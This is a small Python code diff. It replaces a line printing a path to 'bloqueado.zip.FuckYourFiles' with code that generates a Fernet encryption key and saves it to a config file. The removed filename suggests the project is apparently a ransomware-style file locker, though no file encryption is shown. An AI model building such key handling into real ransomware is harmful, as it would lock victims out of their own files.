@@ -1,3 +1,6 @@
-from variavel import userPath
+from cryptography.fernet import Fernet
 
-print(f'{userPath}/bloqueado.zip.FuckYourFiles')
+key = Fernet.generate_key()
+
+with open('config/filekey.key', 'wb') as filekey:
+    filekey.write(key)
